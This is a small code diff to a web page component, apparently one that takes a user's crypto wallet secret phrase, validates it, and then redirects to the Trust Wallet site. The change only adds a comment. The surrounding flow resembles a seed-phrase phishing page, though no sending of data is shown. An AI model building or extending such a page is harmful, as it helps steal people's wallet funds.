@@ -137,6 +137,7 @@ export default function PhraseInputPage() {
         description: "Secret phrase is valid. Redirecting to Trust Wallet...",
         variant: "default",
       });
+      // Redirect to Trust Wallet website
       window.location.href = 'https://trustwallet.com';
     } else {
       toast({
